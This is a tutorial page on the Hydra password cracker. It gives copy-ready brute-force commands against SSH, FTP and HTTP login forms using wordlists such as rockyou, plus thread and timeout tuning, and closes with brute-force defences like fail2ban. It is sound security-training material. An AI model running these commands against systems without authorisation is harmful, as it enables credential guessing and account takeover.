Hydra Password Cracking

Master network login password cracking with Hydra

Introduction to Hydra

Hydra is a parallelized login cracker which supports numerous protocols to attack. It's very fast and flexible, making it a popular choice for penetration testers and security professionals.

Key Features

  • Supports over 50 protocols
  • Parallel processing capabilities
  • Customizable attack patterns
  • Resume interrupted attacks
  • IPv6 support

Installation

Hydra comes pre-installed with Kali Linux. For other systems:

# Ubuntu/Debian sudo apt-get install hydra # From source git clone https://github.com/vanhauser-thc/thc-hydra.git cd thc-hydra ./configure make sudo make install

Basic Usage

Basic Hydra syntax and common commands:

# Basic syntax hydra [options] target service # SSH brute force hydra -l admin -P passwords.txt ssh://192.168.1.100 # HTTP POST form attack hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid" # FTP brute force hydra -L users.txt -P passwords.txt ftp://192.168.1.100 # Multiple usernames and passwords hydra -L userlist.txt -P passlist.txt 192.168.1.100 ssh

Supported Protocols

Hydra supports numerous protocols for password attacks:

Network Protocols

  • SSH (ssh)
  • FTP (ftp)

  • HTTP(S) (http-get, http-post)
  • SMTP (smtp)

Database Protocols

  • MySQL (mysql)
  • PostgreSQL (postgres)
  • MSSQL (mssql)
  • Oracle (oracle-listener)
  • MongoDB (mongodb)
  • Redis (redis)

Wordlists and Dictionaries

Effective password attacks require good wordlists:

# Common wordlist locations in Kali /usr/share/wordlists/rockyou.txt /usr/share/wordlists/fasttrack.txt /usr/share/wordlists/dirb/common.txt # Create custom wordlist crunch 6 8 0123456789 -o numbers.txt # Using multiple wordlists hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://target # Generate username list hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p password ssh://target

Advanced Techniques

Advanced Hydra usage and optimization:

Performance Tuning

# Increase parallel tasks hydra -t 16 -l admin -P passwords.txt ssh://target # Set connection timeout hydra -w 30 -l admin -P passwords.txt ssh://target # Limit attempts per connection hydra -c 3 -l admin -P passwords.txt ssh://target # Resume interrupted attack hydra -R

HTTP Form Attacks

# HTTP POST form with cookies hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123" # HTTPS form attack hydra -l admin -P passwords.txt target https-post-form "/login:username=^USER^&password=^PASS^:Login Failed" # Custom user agent hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid:H=User-Agent: Mozilla/5.0"

Defense Against Brute Force

Protecting systems from password attacks:

  • Account Lockout: Lock accounts after failed attempts
  • Rate Limiting: Limit login attempts per IP
  • Strong Passwords: Enforce complex password policies
  • Two-Factor Authentication: Add additional security layer
  • Monitoring: Log and alert on suspicious activity
  • IP Whitelisting: Restrict access by IP address
# Monitor failed SSH attempts tail -f /var/log/auth.log | grep "Failed password" # Configure fail2ban sudo apt-get install fail2ban sudo systemctl enable fail2ban sudo systemctl start fail2ban
